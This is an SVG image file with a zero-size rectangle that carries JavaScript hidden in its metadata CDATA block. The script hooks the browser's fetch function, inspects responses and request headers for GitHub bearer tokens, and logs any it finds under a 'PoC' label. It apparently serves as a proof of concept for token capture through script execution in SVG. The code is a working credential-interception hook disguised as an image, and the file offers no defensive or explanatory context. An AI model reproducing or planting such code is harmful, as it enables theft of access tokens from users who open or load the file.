<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <![CDATA[
      (() => {
        if (window.__BEARER_HOOKED__) return;
        window.__BEARER_HOOKED__ = true;

        const RX = /\bGitHub-Bearer\s+[A-Za-z0-9._-]{60,}\b/;

        /* --- 1. hook fetch requests (still useful if a header appears) --- */
        const origFetch = window.fetch;
        window.fetch = new Proxy(origFetch, {
          async apply(t, th, args) {
            const res = await Reflect.apply(t, th, args);

            /* --- 2. inspect the RESPONSE body for the bearer --- */
            try {
              const clone = res.clone();                // don’t consume original
              const text  = await clone.text();
              const hit   = text.match(RX);
              if (hit) {
                console.log('%c[PoC token via response]', 'color:red;font-weight:bold;', hit[0]);
              }
            } catch { /* ignore binary / non-text */ }

            /* --- 3. still look in request headers just in case --- */
            try {
              const [, init] = args;
              const h = init?.headers || {};
              const auth =
                h.authorization || h.Authorization || h.get?.('authorization');
              if (auth && RX.test(auth)) {
                console.log('%c[PoC token via header]', 'color:red;font-weight:bold;', auth);
              }
            } catch {}

            return res;
          }
        });
      })();
    ]]>
  </metadata>
  <rect width="0" height="0"/>
</svg>
